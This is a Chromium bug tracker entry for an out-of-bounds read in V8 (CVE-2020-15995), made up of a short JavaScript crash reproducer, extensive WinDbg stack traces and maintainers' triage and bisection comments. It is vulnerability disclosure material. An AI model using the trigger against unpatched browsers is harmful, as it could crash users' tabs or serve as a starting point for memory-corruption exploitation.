# Security: Out of Bounds in V8

| Field | Value |
|-------|-------|
| **Issue ID** | [40054143](https://issues.chromium.org/issues/40054143) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2020-15995 |
| **Reporter** | p4...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2020-12-11 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Out of Bounds in V8

**VERSION**  

Chrome Version: [87.0.4280.88] + [stable]  

Operating System: win 10

**REPRODUCTION CASE**

```
var trigger = (loop = new class{ [1337] = ()=>"p4nda"})=>loop  
trigger()[1337]  

```

1. open chrome.exe
2. open an DevTools page and then input the javascript code in console tab (I think it also can trigge via a html file).

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [tab]  

Crash State:

0:025> g  

(2404.1a14): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

chrome!std::\_\_1::\_\_cxx\_atomic\_load [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35]:  

00007ffa`8f426875 8b41ff mov eax,dword ptr [rcx-1] ds:00007b77`1800009b=????????  

0:000> kbL

# RetAddr : Args to Child : Call Site

00 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::\_\_1::\_\_cxx\_atomic\_load  

01 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::\_\_1::\_\_atomic\_base<int,0>::load  

02 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::\_\_1::atomic\_load\_explicit  

03 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::Relaxed\_Load  

04 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::AsAtomicImpl<int>::Relaxed\_Load  

05 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::TaggedField[v8::internal::MapWord,0](javascript:void(0);)::Relaxed\_Load  

06 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map\_word  

07 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map  

08 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map+0x10  

09 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::StringShape::StringShape+0x10  

0a (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::String::IsFlat+0x10  

0b (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::IncrementalStringBuilder::CanAppendByCopy+0x19  

0c 00007ffa`8f233745 : 00000000`00000036 00007ffa`8f2eb923 0000ae64`ada957b1 0000022c`ebd9c75f : chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 0d 00007ffa`8f2333f7 : 00000000`00000000 0000022c`eb8037f8 0000022c`ebda08d8 00000000`955fd300 : chrome!v8::internal::`anonymous namespace'::NativeCodeFunctionSourceString+0x125 0e 00007ffa`8ef84b5f : 00007b77`000000ff 01007ffa`8ef50316 0000ae64`ada954d1 00000000`00000000 : chrome!v8::internal::JSFunction::ToString+0x1a7  

0f 00007ffa`8ef84867 : 0000001a`955fcc60 000000c6`955fcd10 000000c6`955fcf01 00000000`00000000 : chrome!v8::internal::Builtin_Impl_FunctionPrototypeToString+0x8f 10 00007ffa`8f94687c : 00007b77`081ca0a9 00007b77`08244569 00000000`0000001a 000000c6`955fc868 : chrome!v8::internal::Builtin\_FunctionPrototypeToString+0x47  

11 00007ffa`8f8d7ff8 : 00007b77`080423b1 00007b77`08244569 00000000`0000000a 00007b77`08042429 : chrome!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c 12 00007ffa`8f8d7ff8 : 00007b77`08243ef1 00007b77`080d355d 00007b77`085ef399 00000000`0000007a : chrome!Builtins\_InterpreterEntryTrampoline+0xd8  

13 00007ffa`8f8d5afb : 00007b77`080d355d 00007b77`083a7001 00000000`00000022 000000c6`955fca40 : chrome!Builtins_InterpreterEntryTrampoline+0xd8 14 00007ffa`8f8d56ec : 000000c6`955fd978 00000000`00000000 00000000`00000000 000000c6`955fd8a8 : chrome!Builtins\_JSEntryTrampoline+0x5b  

15 00007ffa`8f015972 : 0000022c`eb7ec218 00007ffa`8f07d3e3 0000022c`ebf1d860 0000ae64`ada95851 : chrome!Builtins_JSEntry+0xcc 16 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,unsigned long long,unsigned long long,unsigned long long,long long,unsigned long long \*\*>::Call+0x1b 17 00007ffa`8f015642 : 0000ae64`ada959d1 00007b77`082443f1 000000c6`955fcd18 00007ffa`8f288e9c : chrome!v8::internal::`anonymous namespace'::Invoke+0x2b2 18 00007ffa`8f246d57 : 0000022c`ebd67300 00007ffa`8f0630e9 00007ffa`94f9a988 00007ffa`8f41b382 : chrome!v8::internal::Execution::Call+0xc2  

19 00007ffa`8f246ada : 00000000`00000000 0000022c`e9d96600 0000022c`eb7ec2b8 0000022c`e9d90000 : chrome!v8::internal::JSReceiver::OrdinaryToPrimitive+0x197 1a 00007ffa`8f2853a9 : 000000c6`955fcf80 00007ffa`8ef00ff0 00000000`00000010 0000022c`00000000 : chrome!v8::internal::JSReceiver::ToPrimitive+0x6a  

1b 00007ffa`8ef06ee6 : 0000022c`eb7ec2c8 00007ffa`c29095f1 0000ae64`ada95cf1 00000000`00000000 : chrome!v8::internal::Object::ConvertToString+0xf9 1c (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::Object::ToString+0x2e 1d 00007ffa`8f60f28e : 0000022c`ec05a9f0 000000c6`955fd120 0000022c`eb7ec2e0 0000022c`eb7ec2d8 : chrome!v8::Value::ToString+0x186  

1e 00007ffa`8f60e645 : 000000c6`955fd908 000000c6`955fd968 00007ffa`94f270b0 0000022c`eb7ec2b8 : chrome!v8_inspector::`anonymous namespace'::descriptionForFunction+0x4e  

1f 00007ffa`8f5a2123 : ffffffff`ffffffff 0100022c`ebd54be0 00000000`00000001 00007ffa`8f03fa8a : chrome!v8_inspector::`anonymous namespace'::FunctionMirror::buildRemoteObject+0x595  

20 00007ffa`8f5a3620 : 00000000`00000000 00000000`00000000 00000000`00000000 00007ffa`8f5b065a : chrome!v8_inspector::InjectedScript::wrapObjectMirror+0x83 21 00007ffa`8f5a8ebc : 00000000`00000000 00007ffa`94f27560 000000c6`955fd070 00007b77`00000000 : chrome!v8\_inspector::InjectedScript::wrapObject+0xa0  

22 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8\_inspector::InjectedScript::wrapObject+0x29  

23 00007ffa`8f5a88c8 : 00007b77`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!v8_inspector::InjectedScript::ProtocolPromiseHandler::thenCallback+0x2bc 24 00007ffa`8ef5c11e : 000000c6`955fd070 00007b77`00000000 00000000`00000000 00000000`00000000 : chrome!v8\_inspector::InjectedScript::ProtocolPromiseHandler::thenCallback+0x38  

25 00007ffa`8ef5b566 : 00007b77`080d3a7d 00000000`00000000 00000000`00000000 00000000`00000020 : chrome!v8::internal::FunctionCallbackArguments::Call+0x12e 26 00007ffa`8ef5ab89 : 000000c6`955fd860 ffffffff`ffffffff 0000022c`ebd672c0 00007b77`0000006b : chrome!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>+0x166 27 00007ffa`8ef5a827 : 0000022c`eb7ec290 00007ffa`8f02fef9 0000022c`ebac5ab0 00007ffa`8f02a382 : chrome!v8::internal::Builtin\_Impl\_HandleApiCall+0xf9  

28 00007ffa`8f94687c : 00007b77`080d35c5 00007ffa`8f996ef5 00007b77`08243f11 00000000`00000002 : chrome!v8::internal::Builtin_HandleApiCall+0x47 29 00007ffa`8f99659b : 00007b77`080423b1 00007b77`088a9525 00000000`0000000c 00007b77`08042429 : chrome!Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_BuiltinExit+0x3c  

2a 00007ffa`8f8f8a6e : 00007b77`088a9525 00007b77`080d35c5 00007b77`080d39fd 00007b77`08243f11 : chrome!Builtins_PromiseFulfillReactionJob+0x3b 2b 00007ffa`8f8d59ec : 00000000`00000000 00000000`00000000 00000000`00000002 00000000`00000000 : chrome!Builtins\_RunMicrotasks+0x28e  

2c 00007ffa`8f015fc3 : 00000000`00000000 00000000`080423b1 00000000`00000002 000000c6`955fdde0 : chrome!Builtins_JSRunMicrotasksEntry+0xcc 2d (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,v8::internal::MicrotaskQueue \*>::Call+0x5 2e 00007ffa`8f016a5f : 00007b77`00000000 00000000`00000000 00000000`00000000 00000000`00000020 : chrome!v8::internal::`anonymous namespace'::Invoke+0x903 2f 00007ffa`8f016b66 : 0000022c`e9b40000 00007ffa`c2906e2c 0000022c`e9d90000 00007ffa`00000002 : chrome!v8::internal::`anonymous namespace'::InvokeWithTryCatch+0x6f 30 00007ffa`8f03d3c2 : 00000000`00000000 00000000`00000000 0000022c`eba59770 00000000`00000002 : chrome!v8::internal::Execution::TryRunMicrotasks+0x66  

31 00007ffa`8f03d18f : 0000022c`ebd54be0 000000c6`955fdf48 0000022c`ec05a790 0000022c`eba59770 : chrome!v8::internal::MicrotaskQueue::RunMicrotasks+0x202 32 00007ffa`8f5a439c : 000000c6`955fe110 000000c6`955fdf78 000000c6`955fe050 000000c6`955fe110 : chrome!v8::internal::MicrotaskQueue::PerformCheckpoint+0x1f  

33 00007ffa`8f5ec19c : 0000022c`ebd48850 00000000`00000000 00000000`00000000 00000000`00000140 : chrome!v8_inspector::InjectedScript::addPromiseCallback+0x11c 34 00007ffa`8f59a720 : 0000022c`00000002 0000022c`ec051f01 0000022c`ebadfe90 0000022c`ec051f10 : chrome!v8\_inspector::V8RuntimeAgentImpl::evaluate+0x60c  

35 00007ffa`8f613d79 : 000000c6`955fe660 aaaaaaaa`aaaaaaaa 0000022c`e9b74c70 0000022c`ebd54c10 : chrome!v8_inspector::protocol::Runtime::DomainDispatcherImpl::evaluate+0x380 36 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__function::__policy_func<void ()>::operator()+0xa 37 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::function<void ()>::operator()+0xa 38 00007ffa`8f5e2c00 : 0000022c`ebe55650 000000c6`955fe598 000000c6`955fe790 0000022c`e9bfc8c0 : chrome!v8\_crdtp::UberDispatcher::DispatchResult::Run+0x19  

39 00007ffa`923098ac : 0000022c`e9d902a4 00000000`00000000 00000000`00000000 00000000`00000010 : chrome!v8_inspector::V8InspectorSessionImpl::dispatchProtocolMessage+0x110 3a 00007ffa`923096a2 : 0000022c`e9bee098 00000000`00000000 000000c6`955fe9a0 00007ffa`8ff6c8e3 : chrome!blink::DevToolsSession::DispatchProtocolCommandImpl+0xcc  

3b 00007ffa`8fa5d5f5 : 0000ae64`ada97b11 00000000`ebbf4101 000000c6`955fe9e0 00007ffa`8d97fc59 : chrome!blink::DevToolsSession::DispatchProtocolCommand+0x52 3c 00007ffa`8d1edd50 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000001 : chrome!blink::mojom::blink::DevToolsSessionStubDispatch::Accept+0x135  

3d 00007ffa`90b167d8 : 0000022c`e9bb1498 00007ffa`8ff6efb6 00000000`00000000 00000000`00000000 : chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x230 3e 00007ffa`90b14581 : 00000001`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnProxyThread+0x108 3f (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),void>::Invoke+0x19 40 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::InvokeHelper<0,void>::MakeItSo+0x21 41 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl+0x25 42 00007ffa`8d166df9 : aaaaaaaa`aaaaaa01 0000ae64`ada97921 00000000`00000000 00000000`00000000 : chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped\_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce+0x41  

43 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::OnceCallback<void ()>::Run+0x15  

44 00007ffa`90948a5f : 000000c6`955feee8 00007ffa`8d155f6e 00000000`00000000 000000c6`955fee48 : chrome!base::TaskAnnotator::RunTask+0x169 45 00007ffa`90948671 : aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa 000000c6`955ff200 : chrome!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x22f  

46 00007ffa`8d16456f : 00007ffa`8d1fa8ab 00000000`00000000 00000000`ffffff00 000000c6`955ff258 : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x91 47 00007ffa`8d16440e : 00000000`ffffff00 0000ae64`ada96201 00000000`955ff201 00007ffa`8d157d49 : chrome!base::MessagePumpDefault::Run+0x7f  

48 00007ffa`8d163db6 : 00000000`00000030 0000022c`e9bdf3e0 000000c6`955ff280 00007ffa`94ad97cb : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x6e 49 00007ffa`908d62f1 : 00007ffa`94ca30a8 aaaaaaaa`00000002 00007ffa`94ca4740 00007ffa`8d1ad8f9 : chrome!base::RunLoop::Run+0xb6  

4a 00007ffa`8d178d5a : 00000000`00000008 00007ffa`c005b68a 000000c6`955ff3d0 00007ffa`94ad9a1e : chrome!content::RendererMain+0x381 4b 00007ffa`8fef2504 : 00007ffa`c2a70000 00000000`02000002 00000000`00000000 00000000`00000000 : chrome!content::ContentMainRunnerImpl::Run+0x12a  

4c 00007ffa`8d1601cd : 00000000`00000016 0000022c`e9b426d0 00000000`0000017c 00000000`955ff600 : chrome!content::RunContentProcess+0x364 4d 00007ffa`8d155118 : 00000000`955ff600 0000022c`e9b66110 000000c6`955ff7d0 00000000`00000008 : chrome!content::ContentMain+0x3d  

4e 00007ff7`e762269d : 0000022c`e9b534e0 00007ffa`8d154fb0 00000000`00000008 000000c6`955ff7e0 : chrome!ChromeMain+0x168 4f 00007ff7`e7621b8f : 000000c6`955ff908 000000c6`955ff9f0 00000000`00000000 00000000`00000000 : chrome\_exe!MainDllLoader::Launch+0x1ad  

50 00007ff7`e776f142 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome_exe!wWinMain+0xb8f 51 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome_exe!invoke_main+0x21 52 00007ffa`c1567034 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome\_exe!\_\_scrt\_common\_main\_seh+0x106  

53 00007ffa`c293d0d1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14 54 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21

0:000> u  

chrome!std::\_\_1::\_\_cxx\_atomic\_load [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317] [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317]]:  

00007ffa`8f426875 8b41ff mov eax,dword ptr [rcx-1] 00007ffa`8f426878 0fb7440207 movzx eax,word ptr [rdx+rax+7]  

00007ffa`8f42687d 83e007 and eax,7 00007ffa`8f426880 6683f801 cmp ax,1  

00007ffa`8f426884 0f8483000000 je chrome!v8::internal::IncrementalStringBuilder::AppendString+0xcd (00007ffa`8f42690d)  

00007ffa`8f42688a 4889cb mov rbx,rcx 00007ffa`8f42688d 4889ca mov rdx,rcx  

00007ffa`8f426890 4c21c2 and rdx,r8

0:000> u  

chrome!std::\_\_1::\_\_cxx\_atomic\_load [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317] [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35 [c:\b\s\w\ir\cache\builder\src\v8\src\strings\string-builder.cc @ 317]]:  

00007ffa`8f426875 8b41ff mov eax,dword ptr [rcx-1] 00007ffa`8f426878 0fb7440207 movzx eax,word ptr [rdx+rax+7]  

00007ffa`8f42687d 83e007 and eax,7 00007ffa`8f426880 6683f801 cmp ax,1  

00007ffa`8f426884 0f8483000000 je chrome!v8::internal::IncrementalStringBuilder::AppendString+0xcd (00007ffa`8f42690d)  

00007ffa`8f42688a 4889cb mov rbx,rcx 00007ffa`8f42688d 4889ca mov rdx,rcx  

00007ffa`8f426890 4c21c2 and rdx,r8 0:000> !address 00007b77`1800009b

Mapping file section regions...  

Mapping module regions...  

Mapping PEB regions...  

Mapping TEB and stack regions...  

Mapping heap regions...  

Mapping page heap regions...  

Mapping other regions...  

Mapping stack trace database regions...  

Mapping activation context regions...

Usage: <unknown>  

Base Address: 00007b77`088c0000 End Address: 00007b78`00000000  

Region Size: 00000000`f7740000 ( 3.866 GB) State: 00002000 MEM_RESERVE Protect: <info not present at the target> Type: 00020000 MEM_PRIVATE Allocation Base: 00007b77`00000000  

Allocation Protect: 00000001 PAGE\_NOACCESS

Content source: 0 (invalid), length: e7ffff65

## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### [Deleted User] (2020-12-11)

[Empty comment from Monorail migration]

### wf...@chromium.org (2020-12-11)

Thanks for your report. I can repro on stable 87.0.4280.88 but not on my asan build which is at 89.0.4348.0 ffb3ca0cf9de6de049775b6a33e385e2925e3381. So I'll ask clusterfuzz to try and bisect this.

Triaging High for now, will loop back once CF has had a go at a reproduction.

### cl...@chromium.org (2020-12-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5169487501656064.

### wf...@chromium.org (2020-12-11)

CF can't repro, I can only repro if pasting into console

but bisect shows the revision that fixed it was https://chromium.googlesource.com/chromium/src/+/55f18f838a8d47ab67862f59a640ea9bb8a66bd7 which is https://chromium.googlesource.com/v8/v8/+log/f38f24c7..8ae7ae8f

### wf...@chromium.org (2020-12-11)

assigning to ishell@ as per v8 instructions for 'Builtins'. PTAL - is a merge needed to stable?

### [Deleted User] (2020-12-12)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### p4...@gmail.com (2020-12-14)

[Comment Deleted]

### p4...@gmail.com (2020-12-14)

hi, I found this html can trigge a crash in chrome 87.0.4280.88 (stable).

This is log in windbg which is the same path with my previous report:
0:016> g
(2bac.2354): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!std::__1::__cxx_atomic_load [inlined in chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35]:
00007ffa`77596875 8b41ff          mov     eax,dword ptr [rcx-1] ds:00004168`1800009b=????????
0:000> kbL
 # RetAddr           : Args to Child                                                           : Call Site
00 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__cxx_atomic_load
01 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::__atomic_base<int,0>::load
02 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!std::__1::atomic_load_explicit
03 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::Relaxed_Load
04 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::base::AsAtomicImpl<int>::Relaxed_Load
05 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::TaggedField<v8::internal::MapWord,0>::Relaxed_Load
06 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map_word
07 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map
08 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::HeapObject::map+0x10
09 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::StringShape::StringShape+0x10
0a (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::String::IsFlat+0x10
0b (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::IncrementalStringBuilder::CanAppendByCopy+0x19
0c 00007ffa`773a3745 : 00008258`3acedc2f 00007ffa`7752c150 0000003c`585fd5d0 00004168`0808d4f1 : chrome!v8::internal::IncrementalStringBuilder::AppendString+0x35
0d 00007ffa`773a33f7 : 00004168`0808d6a1 00004168`08279fd1 00004168`0808d671 00000000`00000068 : chrome!v8::internal::`anonymous namespace'::NativeCodeFunctionSourceString+0x125
0e 00007ffa`770f4b5f : 0000003c`585fd668 00007ffa`77a44cba 00007ffa`77a44cba 00004168`0808d671 : chrome!v8::internal::JSFunction::ToString+0x1a7
0f 00007ffa`770f4867 : 00000000`00000053 0000003c`585fd738 00000000`0000001a 0000003c`585fd738 : chrome!v8::internal::Builtin_Impl_FunctionPrototypeToString+0x8f
10 00007ffa`77ab687c : 00000000`0000000a 00004168`08044d55 00004168`0808d6a1 00000000`0000001a : chrome!v8::internal::Builtin_FunctionPrototypeToString+0x47
11 00007ffa`77a47ff8 : 00004168`080423b1 00004168`08244569 00000000`0000000a 00004168`08042429 : chrome!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c
12 00007ffa`77a45afb : 00004168`08243ef1 00004168`08279cd9 00000000`00000022 0000003c`585fd910 : chrome!Builtins_InterpreterEntryTrampoline+0xd8
13 00007ffa`77a456ec : 00000000`00000000 00000000`00000000 00000000`00000002 00000000`00000000 : chrome!Builtins_JSEntryTrampoline+0x5b
14 00007ffa`77185972 : 0000016b`823eb398 00007ffa`771d26ca 00008258`3aced0ef 00000000`00000004 : chrome!Builtins_JSEntry+0xcc
15 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,unsigned long long,unsigned long long,unsigned long long,long long,unsigned long long **>::Call+0x1b
16 00007ffa`77185642 : 0000016b`82317a80 00007ffa`789ac8ec 00004168`00000000 0000003c`585fdf70 : chrome!v8::internal::`anonymous namespace'::Invoke+0x2b2
17 00007ffa`7706f27d : 0000003c`585fdc67 00007ffa`7a364129 aaaaaaaa`aaaaaaaa 00007ffa`7a363a49 : chrome!v8::internal::Execution::Call+0xc2
18 00007ffa`7951e984 : 00004975`6a715fe0 0000016b`823eb338 0000016b`823eb330 0000016b`823eb328 : chrome!v8::Script::Run+0x1fd
19 00007ffa`7951f07e : 00002da6`31825228 0000016b`824e2bb0 0000016b`806a0000 00007ffa`780c67f1 : chrome!blink::V8ScriptRunner::RunCompiledScript+0x2a4
1a 00007ffa`7951aa92 : 00000000`00000000 00004975`6a715f60 00004975`6a715ef0 00007ffa`793765ec : chrome!blink::V8ScriptRunner::CompileAndRunScript+0x26e
1b 00007ffa`7951b902 : 000037ca`77ae27c0 00000000`00000020 000037ca`77ae37d0 00007ffa`7941f356 : chrome!blink::ScriptController::ExecuteScriptAndReturnValue+0xf2
1c 00007ffa`79519c6f : 00000000`00000000 00007ffa`78108cbf 000037ca`77ae27c0 00000000`00000000 : chrome!blink::ScriptController::EvaluateScriptInMainWorld+0x102
1d (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!blink::ClassicScript::RunScriptAndReturnValue+0x3f
1e (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!blink::ClassicScript::RunScript+0x64
1f 00007ffa`7b92e85f : aaaaaaaa`aaaaaa00 00000000`00000000 00002767`5c804840 00000000`00000000 : chrome!blink::ClassicScript::RunScript+0x8f
20 00007ffa`7b92e5e2 : 80000000`00000020 00000000`00000001 00000000`00000006 00000000`00000006 : chrome!blink::PendingScript::ExecuteScriptBlockInternal+0x14f
21 00007ffa`7afec1bd : 00002da6`31825254 00007ffa`789c0653 00002da6`31825254 00000000`00000000 : chrome!blink::PendingScript::ExecuteScriptBlock+0x122
22 00007ffa`7b083b66 : 0000003c`585fe8e0 000037ca`77ae3768 00004a1d`43a0c5a0 00007ffa`7946bab1 : chrome!blink::ScriptLoader::PrepareScript+0xafd
23 00007ffa`7b08399b : 00004975`6a715bd8 00007ffa`7b085dd3 00000000`00000003 00000000`00000000 : chrome!blink::HTMLParserScriptRunner::ProcessScriptElementInternal+0x146
24 00007ffa`7a0d8170 : aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa aaaaaaaa`aaaaaaaa : chrome!blink::HTMLParserScriptRunner::ProcessScriptElement+0x2b
25 00007ffa`7a0d9357 : 0000003c`585fe9a8 00007ffa`752c5f6e 00008258`3acee13f 0000003c`585fea70 : chrome!blink::HTMLDocumentParser::RunScriptsForPausedTreeBuilder+0x70
26 00007ffa`7a0d7ef3 : aaaaaaaa`aaaaaaaa cccccccc`cccccccd 0000016b`80789258 00007ffa`780defb6 : chrome!blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser+0x337
27 00007ffa`7a0d7cb2 : 0000016b`8233d1d0 00007ffa`7534df82 00000000`00000000 aaaaaaaa`aaaaaaaa : chrome!blink::HTMLDocumentParser::PumpPendingSpeculations+0x183
28 00007ffa`77c718c2 : 00000038`b4a463d7 00007ffa`7a0dce55 00007ffa`78c84048 00007ffa`76085bad : chrome!blink::HTMLDocumentParser::ResumeParsingAfterYield+0x82
29 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::OnceCallback<void ()>::Run+0x11
2a 00007ffa`752d6df9 : 00008258`3acee3bf 00008258`3acee24f 00000000`00000000 00000000`00000000 : chrome!blink::TaskHandle::Runner::Run+0x42
2b (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome!base::OnceCallback<void ()>::Run+0x15
2c 00007ffa`78ab8a5f : 0000003c`00000000 0000016b`806a1680 00000000`00000000 0000016b`806a0000 : chrome!base::TaskAnnotator::RunTask+0x169
2d 00007ffa`78ab8671 : 0000016b`823f6927 0000003c`585fef08 0000003c`585ff130 0000003c`585ff100 : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x22f
2e 00007ffa`752d456f : 00007ffa`7536a8ab 00000000`00000000 00000000`ffffff00 0000003c`585ff178 : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x91
2f 00007ffa`752d440e : 00000000`ffffff00 00008258`3acee72f 00000000`585ff101 00007ffa`752c7d49 : chrome!base::MessagePumpDefault::Run+0x7f
30 00007ffa`752d3db6 : 00000000`00000030 0000016b`807c2810 0000003c`585ff1a0 00007ffa`7cc497cb : chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x6e
31 00007ffa`78a462f1 : 00007ffa`7ce130a8 aaaaaaaa`00000002 00007ffa`7ce14740 00007ffa`7531d8f9 : chrome!base::RunLoop::Run+0xb6
32 00007ffa`752e8d5a : 00000000`00000008 00007ffa`c005b68a 0000003c`585ff2f0 00007ffa`7cc49a1e : chrome!content::RendererMain+0x381
33 00007ffa`78062504 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000070 : chrome!content::ContentMainRunnerImpl::Run+0x12a
34 00007ffa`752d01cd : 00000000`00000016 0000016b`807127b4 00000000`00000178 00000000`585ff500 : chrome!content::RunContentProcess+0x364
35 00007ffa`752c5118 : 00000000`585ff500 0000016b`807471f0 0000003c`585ff6f0 00000000`00000008 : chrome!content::ContentMain+0x3d
36 00007ff6`5d90269d : 0000016b`80732e40 00007ffa`752c4fb0 00000000`00000008 0000003c`585ff700 : chrome!ChromeMain+0x168
37 00007ff6`5d901b8f : 0000003c`585ff908 0000003c`585ff910 00000000`00000000 00000000`00000000 : chrome_exe!MainDllLoader::Launch+0x1ad
38 00007ff6`5da4f142 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome_exe!wWinMain+0xb8f
39 (Inline Function) : --------`-------- --------`-------- --------`-------- --------`-------- : chrome_exe!invoke_main+0x21
3a 00007ffa`c1567034 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome_exe!__scrt_common_main_seh+0x106
3b 00007ffa`c293d0d1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
3c 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
0:000> r
rax=000082583acedc9f rbx=000041681800009c rcx=000041681800009c
